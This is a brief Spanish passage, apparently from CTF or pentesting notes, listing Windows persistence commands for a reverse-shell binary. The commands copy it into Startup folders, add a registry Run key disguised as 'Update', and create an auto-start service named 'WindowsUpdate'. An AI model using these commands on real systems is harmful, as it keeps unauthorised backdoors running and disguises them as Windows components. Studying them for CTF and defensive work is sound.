Cada vez que arranque la máquina, el binario se ejecutará (realmente es útil sobre todo en CTFs), así que hay que estar en escucha antes de encender la víctima.
```c
# Para todos los usuarios (como hiciste)
copy shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"

# Para el usuario actual
copy shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# En registro (Run)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\shell.exe"

# Como servicio
sc create WindowsUpdate binPath= "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\shell.exe" start= auto
```
